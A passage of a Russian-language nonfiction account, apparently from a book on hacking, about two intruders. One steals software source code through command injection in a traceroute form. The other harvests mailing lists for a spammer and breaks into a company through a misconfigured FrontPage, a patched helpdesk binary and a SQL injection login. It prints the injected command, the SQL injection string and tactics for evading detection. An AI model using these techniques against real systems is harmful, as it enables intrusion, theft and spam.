а й т а . Если он н а б и р а л команду «tracert», то выполнялась команда «traceroute» — отслеживание пути, по которому пакеты приходили к назначенному IP-адресу. Эрик понял, что может обмануть программу, задав ей команду с адресом IP, за которым он ставил значок «&», а потом еще одну нужную ему команду. Итак. он должен был писать что-то такое:   localhost > null  &&  dir с:\   В этом примере информация прикрепляется к traceroute-коман-де для CGI-текстов. Первая часть (до символа «&») говорит программе выполнить команду «traceroute» для самой себя (что, в общем-то, бессмысленно), а выход послать в никуда, что приведет к его исчезновению. После того, как программа выполнит первую часть команды, символы «&&» покажут, что есть другая команда, которую надо выполнить. Это команда просит показать корневую директорию на диске С — что очень полезно для атакующего, потому что она позволяет ему выполнять любую shell-команду с привилегией того пользователя, который работает на Интернет-сервере в данный момент.  «Это дало мне весь доступ, который мне был нужен», — рассказывал Эрик. «Я получил доступ ко всему, что было на этом сервере».  Эрик был завален информацией. Он вскоре обнаружил, что разработчики компании помещали копии кодов своих программ на сервере каждую ночь. «Это было настоящее богатство — полная копия всех программ объемом пятьдесят мегабит». Он смог выполнить серию команд, чтобы переместить нужные ему файлы в корневую директорию Интернет-сервера, а затем перегрузить их на первую машину, из тех, куда ему удалось проникнуть — backup Интернет-сервер.   ПОЙМАН  !   Инцидент с СЕО тщательно разбирался. Руководство компании было очень обеспокоено, но поскольку у всех них была куча забот, а Эрик был практически незаметен, больше тревоги они не поднимали. Однако по мере того, как он подбирался все ближе и ближе к сердцевине компьютерной системы, Эрику становилось все труднее оставаться незаметным. То, что произошло потом, случается часто — это расплата за долгое пребывание в чужой системе и постоянное продвижение рубежа атаки вперед и вперед. Он только начал перегружать к себе коды вожделенной программы, когда:  «…перегрузив примерно половину, я обнаружил, что загрузка прервалась. Я посмотрел в директорию, но файл оттуда исчез. Я начал просматривать log-файлы и изменения в датах присутствия пользователей и обнаружил, что еще один пользователь в данный момент просматривает log-файлы. Он узнал, что я что-то делаю, по сути дела — он поймал меня».  Тот, кто заметил Эрика, не тратил время попусту и быстро уничтожал важные файлы. Игра была окончена … или нет?  Эрик отсоединился и не показывался в системе около месяца. Он боролся за доступ к этой программе много месяцев, и должен был испытывать сильное разочарование. Однако, он говорит, что это не так.  «Я никогда не впадаю в отчаяние, поскольку это тоже является частью работы. Е с л и мне не удалось проникнуть с первого раза, значит, з а д а ч а более сложная. Н е т с м ы с л а в п а д а т ь в отчаяние. Э т о как компьютерная игра: вы переходите с уровня на уровень и решаете проблему за проблемой. Э т о просто ч а с т ь в с е й игры».  У Эрика своя теория судьбы: достаточное упорство всегда вознаграждается.  «Если какой-то прием не работает, я пробую что-то еще, поскольку я знаю, что обязательно что-то сработает. Всегда что-то срабатывает. Надо просто найти, что».   НАЗАД   —   НА   ТЕРРИТОРИЮ   ВРАГА   Несмотря на провал, через месяц он опять начал атаку и соединился с компьютером СЕО для следующего просмотра записей его переговоров (он сохранял у себя все эти записи), чтобы посмотреть, есть ли там какие-то доклады о его хакерском вторжении. Помня точно день и время, когда он проникал в компьютеры компании и был замечен. Эрик просматривал именно этот участок архивов. Ни одного слова о его атаке или замеченном вторжении там не было. Он вздохнул с облегчением.  Заодно он понял, почему ему так «повезло». Почти в тот же момент, когда он был замечен, у одного из клиентов компании произошла авария. Все сотрудники ИТ-департамента побросали свои дела и занялись ее устранением. Эрик нашел более позднюю запись о том, что парень, который его обнаружил, просто запустил антивирусную программу, но не предпринял никаких дополнительных действий. «Было похоже, что ему что-то показалось подозрительным. Он немного поразбирался с проблемой, не смог понять, в чем дело, и просто забыл о ней».  Эрик ретировался и подождал довольно долго для новой атаки, причем совершал ее более осторожно, только в нерабочие часы, когда он быть уверен, что никого на работе нет.  Кусок за куском он перегрузил к себе весь код полностью, направив передачу через промежуточный сервер, расположенный в другой стране — по той причине, что всем процессом он управлял из своего дома.  Эрик описывал свое знание сети компании с просто фантастическими подробностями, но если вспомнить о том количестве времени, которое он провел входя и выходя во все системы компании, к какой тщательностью он изучал все их детали — это становится вполне понятным.  «Я знал их систему лучше, чем кто бы то ни было. Любую их проблему я мог бы разрешить гораздо лучше, чем это могли сделать они сами. Я имею в виду, что прекрасно знал каждую часть их сети не только снаружи, но и изнутри».   Е  Щ  Е   НЕ   ТАМ  …   Эрик наконец заполучил, безопасно перегрузив к себе на компьютер, коды программ сервера… но еще не в такой форме, чтобы их можно было открыть и изучать. Из-за огромных объемов программ разработчики обычно хранят их на сервере в сжатом виде «zip». Эрик попробовал расшифровать их обычной unzip-программой, но это ему не удалось. Тогда он обратился к плану В.  Эрик использовал новый усовершенствованный «взламыватель» паролей PkCrack, который использовал технику под названием «атака с известным текстом». Зная определенное количество текста в расшифрованном виде, и имея полный зашифрованный текст, программа могла расшифровать его весь или все файлы в архиве. «Я открыл zip-файл и обнаружил там файл „logo.tif“, затем я направился на их главный Интернет сайт и просмотрел там все файлы под названием „logo.tif“. Я перегрузил его к себе и „зазиповал“, после чего обнаружил, что у него в точности такая же проверочная сумма, как и у одного из защищенных zip-файлов, которые я старался раскрыть».  Теперь у Эрика был зашифрованный zip-файл и его расшифрованная версия logo.tif. Всего за пять минут программа PkCrack сравнила обе эти версии и раскрыла пароль для их расшифровки. С помощью пароля он быстро раскрыл все файлы.  После сотен длинных ночей Эрик наконец получил в свои руки полный текст программы, за которым он так долго и упорно охотился.  По поводу того, почему достижение отняло так много времени. Эрик отвечает:  «Каждому нравится что-то свое. Я люблю ставить перед собой задачу и решать ее так, чтобы меня не обнаружили. Я люблю делать все не так, как другие, и очень тихо. Я люблю находить креативные пути к решению любой проблемы. Действительно, перегрузить к себе текст может быть, и проще, но насколько интереснее мой путь. Крадите тексты, если вы воришка, а если можете избежать этого — будьте хакером».  Что же он делал с полученной программой и генератором ключей? Ответ состоит в том, что он и Роберт — герой следующей истории — ставят перед собой цели, которые типичны для кракеров всего мира. Вы найдете подробный рассказ об этом в разделе под названием «Распределение» перед окончанием главы.   РОБЕРТ  ,   ДРУГ   СПАМЕРА   В далекой Австралии живет еще один из этих честных джентльменов, которые днем трудятся, как уважаемые профессионалы в области безопасности и становятся опасными хакерами ночью, оттачивая свое мастерство и расплачиваясь в своих взаиморасчетах при помощи проникновения в самые труднодостижимые программистские компании мира.  Но Роберта, о котором у нас пойдет речь, нельзя было просто причислить к этой категории. Он слишком сложная личность для этого: один месяц он тратит на погоню за какой-нибудь программой исключительно ради собственного удовольствия и удовлетворения своего тщеславия, а другой месяц, чтобы заработать деньги, тратит на занятие, которое он сам же называет «грязным спамом». Не грязным. поскольку спамерство не его личная цель: и в то же время грязным из-за типа спамерства, которым он занимался.  «Зарабатывать себе на жизнь хакерством», — говорит он, «это жизненный принцип». Он не испытывал особого стыда, рассказывая нам свою историю. Он делал это безо всякого принуждения. При этом он даже придумал новый термин: «Вы можете назвать меня „спикером“ — хакером, который работает для спамеров».  «Ко мне обратился мой друг, который сказал: „Я хочу продать несколько порнофильмов с жестким мазохизмом тысячам людей. Мне хотелось бы получить несколько миллионов адресов электронной почты любителей подобных видеофильмов“.  Скорее всего, вы или я отказались бы от подобного предложения. Роберт «немного подумал об этом» и все же решил посмотреть, как он может решить поставленную задачу.  «Я просмотрел все эти жесткие мазохистские сайты», — говорит он, подчеркивая, что делал это, несмотря «на явное недовольство своей подружки». Свой поиск он проводил прямым и ясным способом — при помощи поисковика Google и другой поисковой машины  http://www.copernic.com  , которая использовала различные поисковики.  В результате он получил список для работы: «Единственное, что я хотел узнать из всех этих порносайтов — это список людей, любящих мазохистские порнофильмы и желающих получить новинки этой гадости». Если Роберт и собирался помочь спамеру, то он не намеревался сам, «как все эти идиоты», рассылать сотни электронных писем всем и каждому, кто проявил хоть малейший интерес к объявленной теме, а также и тем, кто не проявлял к ней ни малейшего интереса.   ПОЛУЧЕНИЕ   СПИСКА   РАССЫЛКИ   Роберт обнаружил, что многие из тех самых мазохистских сайтов пользуются одним и тем же приложением для управления списком своих подписчиков, которое я буду называть SubscribeList.  «При помощи Google я обнаружил человека, который заказал себе такое приложение и хранил его на своем Интернет-сервере. По-моему, это был сайт где-то в Китае или на Тайване».  Следующий шаг был даже еще проще, чем он думал. «Интернет-сервер был сконфигурирован неправильно. Каждый пользователь мог посмотреть исходные коды его программ. Это была не самая последняя версия программ, но все же достаточно свежая».  Ошибка же заключалась в том, что кто-то случайно или по небрежности оставил сжатый архив этих программ в директории документов Интернет-сервера. Роберт перегрузил себе все коды программ.  С помощью этих программ и имен, которые он получил с сайтов, Роберт сделал вывод:  «Я мог бы разослать электронные письма с таким текстом: „Захотите на мой сайт, у нас есть нечто специальное по теме „порки“ за полцены. Масса людей подписалась бы на такое предложение“.  Итак, хотя у него была программа для управления листом рассылки, у него не было самого листа рассылки.  Он сел и начал изучать коды SubscribeList и в конце концов обнаружил некую возможность, написав программу Perl. Подробное техническое объяснение достаточно сложное (смотрите в разделе «Анализ» в конце главы).  Аналогично тому, как кракер в предыдущей истории использовал символ «&» для обмана программы и выполнения нужной ему команды, Роберт использовал брешь в «setup.pl». Этот хакерский путь называется «backticked variable injection flaw», он использует недоработку в программе setup.pl, которая недостаточно тщательно проверяет данные, передаваемые ей. (Различие лишь в операционных системах. Метод Эрика работал в среде Windows: метод Роберта — в Linux). Злонамеренный атакующий может послать такую команду, которая поменяет значение некоторого параметра таким образом, что текст может измениться на другой Perl-текст, который будет исполнять произвольные команды. Благодаря этой оплошности программиста атакующий может встраивать собственные команды.  С помощью этого метода можно было обманывать setup.pl, заставляя его думать, что атакующий только что установил SubscribeList и хочет сделать начальную установку параметров. Роберт мог использовать этот трюк с любой компанией, которая использовала уязвимую версию программного обеспечения. Как же ему отыскать мазохистскую компанию, которая удовлетворяла бы этим требованиям?  Текст программы, по словам самого Роберта, « б ы л очень хитрым и извилистым». Когда работа программы заканчивалась, она уничтожала все следы своего присутствия и возвращала все значения переменных к их начальным величинам, так что никто не мог ничего сказать о случившемся. «И насколько я знаю, никто не смог заметить ее действия».  Ни один разумный хакер не стал бы посылать эти файлы прямо на свой компьютер таким образом, что его можно было бы выследить. «Я настоящий ф а н а т Интернета. Я люблю Интернет. С е т ь допускает анонимность. Вы можете войти в Интернет из какого-нибудь кафе и никто не догадается, кто вы на самом деле. Мне нравится несколько раз обежать вокруг земного шара, причем каждый раз по-новому. Подобную связь сложнее отследить, а в log-файле это будет всего одна или две строчки».   ДОХОД   ОТ   ПОРНОГРАФИИ   Роберт обнаружил, что многие мазохистские сайты используют одно и то же программное обеспечение для проведения рассылки. При помощи его модифицированной программы он попадал на эти сайты и извлекал к себе их список рассылки, который он затем переправлял своему другу-спамеру. Роберт подчеркивает: «Я не был прямым спамером».  Его маркетинговая политика оказалась невероятно успешной. Когда вы рассылаете свои предложения тем людям, о которых знаете, что они «действительно любят эту мерзость» (используя меткое выражение Роберта) эффективность откликов превосходит все ожидания.  «Обычно вы ожидаете процент отклика в 0,1 — 0,2%. Мы получили 30%, во всяком случае, так говорят опросы. 30 — 40% людей купили кассету. Для мира спамеров — это абсолютный рекорд. В результате этой деятельности было получено сорок пять — пятьдесят тысяч долларов и мне досталась треть».  Успех этой продажи основан прежде всего на том, что Роберт собрал список людей, желающих выложить деньги за товар такого рода. Если числа, которые он называет, точные, то можно только сожалеть о мире, в котором мы живем.  Роберт говорит, что собрал от десяти до пятнадцати миллионов имен!   РОБЕРТ   КАК   ЛИЧНОСТЬ   Несмотря на этот эпизод, Роберт настаивает: «я не являюсь мерзким спамером; я честный и прямой человек». В подтверждение своих слов он объясняет, что работает в области безопасности для одной «очень религиозной и честной компании» и берет внешние заказы, как независимый консультант в области безопасности. Он даже публикует статьи по темам в сфере безопасности.  Он очень поэтично выражает свое отношении к занятию хакерством.  «Я очень люблю, когда передо мной встает определенный вызов, я люблю сражаться с системой на уровне конфигурации или социальной инженерии, а не только на техническом уровне — социальная инженерия означает проникновение в человека, сидящего за компьютером».  За плечами Роберта долгая история хакерства. Он упоминает своего друга (американского хакера, чье имя он не хочет называть), который играл с ним в такую игру:  «Мы оба часто проникали в компании разработчиков, которые создали такие известные программы как Active X controle и Delphi controls, а также множество небольших, но приятных программ для программирования. Е с т ь даже специальный журнал на э т у тему, а там рекламируются в с е программные новинки. И м ы с р а з у ж е смотрели, е с т ь л и там что-то, ч т о мы еще не получили. Особенно игры».  Он бродил по внутренним сетям главных производителей компьютерных игр и получал коды программ их игр.  Совершенно случайно он и его приятель-хакер обнаружили. что «мы проникаем практически в каждую компанию, которая рекламирует свой новый продукт. Мы уже были там, там и там…  Мы стараемся просто проникнуть туда, но получаем все, что хотим».  И все же одна область была особенно интересна Роберту: программные продукты для того, что он называл «продукция видео по почте» — в частности, программы, которые используются для анимации в кинофильмах.  «Я люблю то, что делают эти ребята. Среди них попадаются настоящие гении. Я люблю читать их программы и понимать, как они работают, они выглядят так дико, когда на них смотришь. Я имею в виду, когда смотришь по телевизору мультипликационные фильмы. Дьявол, как это круто!»  Особенно он любил изучать коды с математической точки зрения — «уравнения и функции, а главное человеческий интеллект, который ими управляет. Это феноменально!»  Все это и привело его к тому, что он называет самым памятным случаем хакерства.   ИСКУШЕНИЕ   ПРОГРАММОЙ   В 2003 году Роберт по своему обыкновению просматривал анонсы продуктов в программном журнале и обнаружил новый продукт для изготовления «цифровых видеоэффектов, забавных штучек со светом — одно из приложений, с помощью которого они делают свет выглядящим реально, а поверхности предметов — отражающими этот свет».  Главное достоинство этого продукта заключалось в том, что он использовался при производстве нового полноформатного анимационного фильма — одно из тех средств, которое использовалось для дизайна, моделирования и съемки фильма.  «Когда я узнал об этом, то подумал, что это круто. И некоторые люди из кругов, в которых я вращался в Интернете, были очень заинтересованы в этом программном обеспечении. Масса людей хотела заполучить его в свои руки.  Каждый хотел получить это приложение, поскольку его трудно достать, оно дорого стоит — две, а то и три тысячи долларов. Е г о используют такие гиганты как Industrial Light and Magic и, может быть, еще четыре-пять компаний в мире купили его.  Так или иначе, я действительно захотел получить в свои руки эту программу и решил отыскать компанию, у которой я буду ее извлекать. Компания «Икс» — вы согласны? Э т а компания расположена в США, и вся ее сеть была централизована».  В его задачу не входило добывать эту программу для себя, он хотел разделить обладание ею с миллионами пользователей Интернета по всему миру.  Он обнаружил, что у компании «есть межсетевой экран и небольшая сеть. У них было много серверов и Интернет-серверов. По моим оценкам у них было сто — сто пятьдесят сотрудников».   РАСКРЫВАЯ   ИМЕНА   С  Е  Р  В  Е  Р  О  В   Роберт использовал обычную стратегию, когда он пытался проникнуть в корпоративную сеть достаточно большого размера. Он «начал разбираться, как они заботятся о людях, которые хотят войти в их сеть. У большой компании в этом плане гораздо больше проблем. чем у маленькой. Если у вас пять сотрудников, вы каждому из них можете послать электронное письмо, правильно? Или вы можете собрать их всех и сказать, „вот как вы можете соединиться с вашим сервером из дома, а вот как вы можете дома просматривать свою электронную почту“.  А вот у большой компании должна быть специальная служба Help Desk или какие-то внешние службы, куда люди могли бы обратиться при возникновении проблем с компьютером. Роберт знал, что компании с большим числом сотрудников должны иметь большое число разнообразных инструкций — в основном на их Help Desk — объясняющих, как получить удаленный доступ к своим файлам и электронной почте. Если бы ему удалось отыскать эти инструкции, он бы смог понять необходимую последовательность шагов по проникновению в эту сеть извне, в частности, какое программное обеспечение необходимо для соединения с внутренней сетью поверх корпоративной VPN (Virtual private network — виртуальная частная сеть). В частности, он надеялся найти, какие точки используют разработчики для доступа к системе разработки извне, поскольку они должны постоянно иметь доступ к своим кодам.  На этом этапе ему надо было найти путь к Help Desk. «Я начал с небольшой программки под названием Network Mapper, кo-торую написал сам однажды. Она перебирает список типичных номеров узлов. Я использую ее в моих анализах DNS».  Network Mapper идентифицирует узлы и находит IP-адреса для каждого из них. Программа Perl (также написанная Робертом), перебирает список общеупотребительных имен узлов и проверяет, нет ли таких же имен в домене атакуемой компании. Итак, для атаки на компанию под названием «digitaltoes», хакерское средство может искать web.digitaltoes.com, mail.digitaltoes.com и т.д. При таком поиске можно найти скрытые IP-адреса или сетевые блоки, которые не так просто идентифицировать. После работы программы он может получить результаты, которые выглядят так:   beta.digitaltoes.com    IPAdress #1:63.149.163.41…   ftp.digitaltoes.com   IPAdress #1:63.149.163.36…  intranet.digitaitoes.com  IPAdress #1:63.115.201.138…  mail.digitaltoes.com  IPAdress #1:63.149.163.42…   www.digitaitoes.com   IPAdress #1:63.149.163.36…   Отсюда следует, что наша фиктивная компания «digitaitoes» имеет некоторые сервера в сетевом блоке 63.149, но я поставил бы свои деньги на сервер в сетевом блоке 65.115 с именем «intranet», что соответствует их внутренней сети.   НЕКОТОРАЯ   ПОМОЩЬ   ОТ   H E L P D E S K . E X E   Среди серверов, которые Роберт обнаружил с помощью своего Network Mapper был один, на который он особенно надеялся: helpdesk.companyX.com. Когда он пытался проникнуть на этот сайт, то появилось диалоговое окно с требованием ввести имя пользователя и пароль, допуская туда только авторизованных пользователей.  Приложения для helpdesk находились на сервере, где работала IIS4, древняя версия Microsoft Internet Information Server (IIS), которая, как Роберт знал, имела целый ряд лазеек. При небольшом везении он мог бы найти одну незаделанную и поэтому полезную для него.  Он обнаружил зияющую дыру. Некоторые администраторы компаний инициируют MS Front Page таким образом, что любой может выгрузить или загрузить файлы из корневой директории, где хранятся файлы Интернет-сервера.  (Мне хорошо знакома эта проблема. Однажды Интернет-серверы в компании по обеспечению безопасности, которую я создал, были атакованы через аналогичную брешь, потому что системный администратор, который добровольно помогал мне, неправильно сконфигурировал систему. К счастью, сервер работал в своем собственном сегменте сети, отделенном от остальной).  Поняв, что эта ошибка дает ему возможность загружать файлы на сервер и сгружать с сервера, он начал смотреть на параметры сервера.  «Наиболее распространенный вариант использования тупых IIS-серве-ров состоит а возможности авторизации FrontPage».  И у этого сайта была такая слабость. Развертывание Microsoft FrontPage (программа-приложение, используемая для простого создания и редактирования HTML-документов) без установки соответствующих разрешений на пропуск файлов — обычное заблуждение системных администраторов, которые иногда специально конфигурируют так сайт из соображений удобства. В данном конкретном случае любой человек мог не только прочесть файлы, но также и загрузить туда файлы в любую незащищенную директорию. Роберт действовал в том же стиле.  «Я смотрел на все это и думал: «Черт побери, я могу прочесть или отредактировать любую страницу на этом сервере без всякого имени пользователя или пароля.  Таким образом, я мог войти и изучать корневую директорию на Интернет-сервере».  По мнению Роберта, большинство хакеров упускают такую возможность.  «Дело в том, что когда люди устанавливают сканер сети на сервере, они чаще всего не смотрят на ошибки в конфигурации таких приложений, как FrontPage. Они смотрят (чтобы посмотреть на тип сервера) и говорят „ Э т о Apache“ или „ Э т о I I S “ . И они упускают возможность упростить свою жизнь в том случае, если FrontPage неправильно сконфигурирована».  Это было не так прекрасно, как он ожидал, поскольку «на этом сервере было не так уж много интересного». И все же он заметил, что приложение под названием «helpdesk.exe» появляется, когда он получает доступ к сайту через свой браузер. Это могло бы оказаться очень полезным, но требовало знать имя пользователя и пароль.  «Итак, я смотрел на все это и думал, как атаковать этот треклятый сайт? Я не люблю делать одну вещь: это загружать файлы на Интернет-сервер, потому что, если администратор просмотрит записи об Интернет-активности и увидит, что среди тысячи сотрудников его компании, которые обращались к helpdesk.exe, неожиданно оказался парень из Южной Атлантики, работающий с two.exe или каким-то другим приложением, это сразу насторожит его, правильно? Поэтому я старался избегать подобных записей».  Приложение helpdesk состоит из одного исполняемого файла и файла библиотеки динамических связей ( D L L ) (файлы с расширением .DLL содержат набор функций Windows, которые может вызывать приложение).  Имея возможность загружать сайты в корневую директорию Интернет-сайта, атакующий может легко загрузить туда простую программку, которая даст возможность хакеру выполнять команды через свой браузер. Но Роберт был не простым хакером. Он гордился собой, потому что он был невидим и практически не оставлял следов в записях Интернет-сервера. Вместо простой загрузки на сервер переделанной программы, он перегружал на свой компьютер файлы helpdesk.exe и helpdesk.dll, чтобы понять, как работают эти приложения, полагаясь на свой опыт и знания. «Я проделал массу работы по обратной инженерии приложений и изучению программ, написанных на ассемблере, поэтому я знаю, как разбираться в скомпилированном с языка С коде и переводить его обратно на ассемблер».  Программа, которой он пользовался, называлась I D A Pro, интерактивный «дисассемблер» (ее продают на сайте  http://www.ccso.com  ), ей пользовались по его словам «многие компании, занимающиеся вирусами и охотой на вирусных червей, которым нужно декомпилировать некоторые тексты до уровня ассемблера, а потом разобраться в том, что они делают». Он декомпилировал helpdesk.exe и, одобрил работу, выполненную профессиональными программистами, решив, что она «написана вполне прилично».   ИЗ   МЕШКА   ХАКЕРСКИХ   ШТУЧЕК  :   АТАКА   S  Q  L   INJECTION   После того, как он декомпилировал программу, Роберт обратился к изучению кода, чтобы понять, будет ли приложение helpdesk подвержено SQL injection, методу атаки, который использует распространенную компьютерную оплошность. Программист, думающий о безопасности системы, постарается отфильтровать все запросы внешних пользователей, в которых встречаются такие символы, как «апостроф», «знак цитирования», «больше» и «меньше». Если не отбрасывать программы с подобными символами, то злонамеренный пользователь может обмануть приложение и проникнуть в систему.  Роберт выяснил, что приложение helpdesk проводит необходимые проверки на подобные символы, чтобы помешать хакерам использовать SQL injection. Большинство хакеров перегрузили бы программу ASP на Интернет-сервер и использовали бы ее, но не Роберт! У него были более обширные планы, чем использовать простейшую лазейку для проникновения в свою мишенью.  «Я подумал: „Ситуация выглядит очень забавной, и надо получить от нее максимум удовольствия“.  Я сказал себе: «Хорошо, я использую SQL-injection, слегка подправив проверку на достоверность». Я нашел строку, где содержался список недопустимых символов, и изменил ее. По-моему, в список входило «подчеркивание», или что-то похожее, чего я не должен был использовать, но в то же время его отсутствие ни на что не влияло».  Другими словами, он немного видоизменил программу (используя цифровой редактор для взлома программы, которая должна была проверять символы), так что определенные специальные символы больше не отвергались. После этого он мог незаметно производить SQL-injection, не влияя на всю структуру работы приложения для всех остальных. Еще одним преимуществом такого развития событий было то, что администратор, скорее всего, не стал бы проверять сохранность приложения helpdesk, поскольку не было никаких сигналов о том, что оно взломано.  Далее Роберт послал модифицированную версию приложения helpdesk на Интернет-сервер, заменив им оригинальную версию. Подобно тому, как некоторые люди любят привозить марки, открытки или спичечные коробки с видами тех мест, где они побывали, хакеры иногда хранят не только полученную добычу, но и тексты программ, которые они использовали в своей работе. У Роберта до сих пор хранится текст той программы в двоичном скомпилированном виде.  Поскольку он работал из дома (дело рискованное, если вы только сознательно не хотите попасться), то свою «новую и улучшенную» версию приложения helpdesk он загружал через целую цепь промежуточных прокси-серверов (это серверы, работающие посредниками между компьютером пользователя и компьютером, в который он стремится проникнуть). Если пользователь делает запрос о ресурсе с компьютера «А» , этот запрос направляется на прокси-сервер, который в свою очередь делает запрос и получает ответ от компьютера «А», а потом уже переправляет его клиенту.  Прокси-серверы обычно используются для доступа к ресурсам Интернета из-за межсетевого экрана. Роберт повысил степень своей безопасности, используя несколько прокси-серверов, расположенных в различных частях мира, чтобы снизить вероятность быть пойманным. Так называемые «открытые прокси-серверы» обычно используются для того, чтобы замаскировать место, откуда исходит кибератака.  При помощи модифицированной версии приложения helpdesk, загруженного на компьютер и запущенного, Роберт соединился с сайтом-мишенью, использующим Интернет-браузер. Когда перед ним появилась входная форма с запросом имени пользователя и пароля, он запустил атаку SQL injection, как и планировал. В нормальном режиме, после того как пользователь введет свои имя и пароль — скажем, «davids» и «zl8M296q» — приложение использует эти входные данные для того, чтобы сгенерировать такую SQL-команду:   select record from users where user = 'davids'   and password = 'z18M296q'   Если поле пользователя и поле пароля будут соответствовать информации в базе данных, тогда пользователя пускают в систему. Таким образом, все должно работать в нормальном режиме. А вот как проходила атака Роберта SQL-injection: в разделе для имени пользователя он написал — '  or  where  password  like  '%   Для пароля он ввел аналогичную строку  '  or  where  password  like  '%   Приложение использует эти входы и генерирует такую SQL-ко-манду:   select record from users where user = ' or where password like '%' and password  =  'or where password like '%'   Элемент строки  or  where  password  like  % говорит SQL принять запись, если пароль  что угодно  ( ' % ' — это пустышка). Обнаружив, что пароль удовлетворяет этому дикому условию, приложение впускает Роберта, как вполне законного пользователя, как если бы он ввел данные о законной авторизации. Система впускает его и связывает с данными первого пользователя в базе данных, которым обычно бывает администратор. Так и оказалось в нашем конкретном случае. Роберт не только вошел в систему, но и получил привилегии администратора.  Отсюда он получил возможность увидеть переписку всех сотрудников или авторизованных пользователей после успешного входа в систему. Просмотрев несколько таких посланий, он извлек из них информацию о номерах телефонов dial-up для соединения с сетью, а также адреса гиперлинков для добавления и удаления пользователей из внутренней защищенной сети. Компания использовала VPN-сервер Microsoft, который настраивается таким образом, что сотрудники используют их имена и пароли для Windows, чтобы войти в него. Поскольку Роберт находился в приложении helpdesk с привилегией администратора, он получил возможность добавлять пользователей в VPN-группу и изменять их пароли для компьютеров, работающих в ОС Windows.  Дело продвигалось не быстро. Несмотря на то, что он находился в приложении с привилегиями администратора, это ни на шаг не приблизило его к кодам программы. Следующей целью Роберта стала попытка получить доступ к их внутренней сети через настройки VPN.  В качестве проверки, через меню helpdesk он попытался изменить пароль одного из «спящих» аккаунтов (в этом случае его активность было труднее заметить сразу) и добавить его в группу администратора. Он выяснил, как устроена V P N и «попробовал команду VPNin. Все было хорошо, но работало медленно».  «Я проник внутрь примерно в час ночи. Поскольку я находился в Австралии, разница во времени играла мне на руку, в Америке был час ночи, а в Австралии — разгар рабочего дня. Я хотел войти в сеть, когда там наверняка никого нет, и не хотел, чтобы кто-нибудь зашел и заметил меня. Может быть, у них надо было писать отчет о каждом таком случае. Я хотел быть спокоен».  Роберт считает, что он понимает, как работают люди, занимающиеся безопасностью информационных технологий, поскольку они не слишком отличаются от остальных людей, «Единственный способ заметить меня для них были регулярные проверки записей о всей активности в сети». Его мнение о людях, занимающихся ИТ и безопасностью, как минимум, не восторженное. «Поверьте, люди не просматривают подобные записи каждое утро. Когда они садятся за свой компьютер, они берут чашечку кофе и читают последние новости в Интернете. Это гораздо интереснее, чем бросаться проверять, не изменил ли кто-нибудь вчера их пароли».  За время своих хакерских попыток Роберт понял: «когда вы меняете что-то на сайте, люди либо замечают это сразу, либо не замечают никогда. Изменения, сделанные мной, можно было заметить только в том случае, если запускать специальную программу типа Tripware». Роберт имеет в виду приложение, которое проверяет целостность системы и ее приложений, производя вычисление криптографических проверочных сумм и сравнение их с таблицей известных значений. «Тогда они заметили бы, что программа была изменена».  В этом он был абсолютно убежден и употреблял специальный термин «М&М-безопасность» — жесткая на вид и мягкая на самом деле. «В обычных условиях никто не беспокоится о наличии хакера в их сети, потому что они находятся внутри системы. После того, как вам удалось проникнуть внутрь тщательно охраняемого периметра, вы можете чувствовать себя практически, как у себя дома». (Эта фраза означает, что после проникновения хакера в систему и использования им внутренних ресурсов от имени какого-то авторизованного пользователя, очень трудно понять, что это чужеродная активность).  Он обнаружил, что аккаунт пользователя, в который он проник (изменив пароль) через приложение helpdesk, позволил ему проникнуть в сеть через сервис Microsoft VPN. После этого его компьютер соединился с внутренней сетью компании так, как если бы он использовал компьютер, физически включенный в сеть в помещениях компании.  Итак, он прилагал все усилия для того, чтобы не оставить следов, которые внимательный системный администратор мог бы заметить, и уйти «без шума и пыли».  После соединения с внутренней сетью Роберт определил имена компьютеров, работающих под Windows и их IP-адреса, находя компьютеры с именами FINANCE, BACKUP2, WEB и HELPDESK. Он обнаружил и другие — с именами людей, это были компьютеры отдельных пользователей. Он шел по пути уже не раз описанному другими людьми на этих страницах.  По поводу имен серверов можно сказать, что у кого-то в компании было специфическое чувство юмора, достаточно распространенное на рынке высоких технологий. Все началось еще во времена расцвета компании Apple Computer. Стив Джобс, известный своими удивительными творческими способностями и манерой нарушать все традиции и правила, решил, что комнаты для переговоров в зданиях компании не будут носить обыденные и скучные номера вроде 212А или «комната для переговоров шестого этажа». Вместо этого он назвал их именами героев мультфильмов в одном здании, именами кинозвезд — в другом, и так далее. Роберт обнаружил, что компания, в которую он проник, сделала нечто подобное с некоторыми серверами: помимо того, что она имела отношение к индустрии анимационных фильмов, она и имена серверов выбрала среди известных муль-тяшных персонажей.  Но его привлек сервер с достаточно обычным названием — Backup2. Именно на нем он обнаружил жемчужное зерно: сетевую директорию под именем Johny, где один из сотрудников хранил копии своих файлов. Похоже, что этот сотрудник чувствовал себя достаточно свободно и мало заботился о безопасности. Среди файлов этой директории была и копия его почтовой директории, где находились все его письма. (Под сетевой директорией здесь подразумевается жесткий диск или часть диска, которая специально сконфигурирована так, что позволяет обеспечить доступ к своим файлам различным пользователям).   ОПАСНОСТЬ   КОПИРОВАНИЯ   ДАННЫХ   Общий для всех нас знаменатель заключается в том, что когда мы хотим скопировать для длительного хранения свои файлы, мы хотим сделать это максимально просто. Если на диске есть достаточно места, то мы копируем все. После чего очень быстро забываем о сделанном. Число подобных копий, лежащих повсюду, огромно. Люди просто делают их, а об их удалении задумываются только тогда, когда на сервере заканчивается свободное место.  «Часто, — комментирует Роберт. — подобные копии действительно содержат важную, существенную, удивительную информацию, о которой никто и не вспоминает, потому что она лежит в архиве. Причем с очень невысокой степенью защиты». (Кстати, в мои молодые годы я пришел к такому же выводу. Компания может прилагать немалые усилия для того, чтобы защитить те или иные данные, но вот к архивным копиям тех же самых данных отношение совсем наплевательское. Когда я был «в бегах», то работал в одной юридической фирме, которая хранила ленты со своими копиями в ящике, стоявшем за пределами охраняемой компьютерной комнаты, чтобы их могли забрать представители компании, занимающейся хранением таких лент. Любой мог украсть эти ленты без малейшего опасения быть пойманным). На сервере Backup2 он обнаружил директорию общего доступа, в которую один из сотрудников скопировал все свои файлы. Он постарался представить себе, как это могло получиться:  «Однажды этот парень очень спешил. Он подумал: „мне надо сделать резервную копию“, и он ее сделал, И после трех или четырех месяцев она все еще лежала на прежнем месте.  Я подумал, что этим парнем вполне мог быть системный администратор, поскольку это явно не был обычный разработчик или кто-то еще без соответствующих п р а в доступа. Это был один из тех, кто мог создавать директории общего доступа, но он мало заботился о безопасности».  Роберт продолжает:  «Если бы он разбирался в безопасности, как я, например, то он бы защитил эту сетевую директорию специальным паролем и назвал бы ее как-нибудь неприметно. А п о с л е какого-то времени у д а л и л бы 